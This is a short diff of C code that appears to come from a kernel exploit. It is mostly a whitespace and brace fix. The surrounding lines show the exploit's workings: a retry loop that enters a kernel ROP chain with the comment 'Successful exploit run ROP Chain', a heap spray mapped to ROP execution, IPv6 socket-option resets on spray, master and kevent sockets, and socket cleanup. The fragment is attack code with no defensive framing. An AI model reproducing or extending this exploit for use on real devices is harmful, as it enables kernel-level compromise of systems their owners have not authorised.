@@ -328,7 +328,7 @@ for (int attempts = 0; attempts < 10; attempts++) {
     enter_krop();
     nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL);
     break; // Successful exploit run ROP Chain
-}
+    }
     // Map spray to ROP execution
     char* spray_start = spray_bin;
     char* spray_stop = spray_end;
@@ -361,7 +361,6 @@ for (int attempts = 0; attempts < 10; attempts++) {
     for (int i = 0; i < SPRAY_TOTAL; i++) if (spray_sock[i] >= 0) reset_ipv6_opts(spray_sock[i]);
     reset_ipv6_opts(master_sock);
     reset_ipv6_opts(kevent_sock);
-
 
     cleanup_sockets(spray_sock, SPRAY_TOTAL);
     close(kevent_sock);
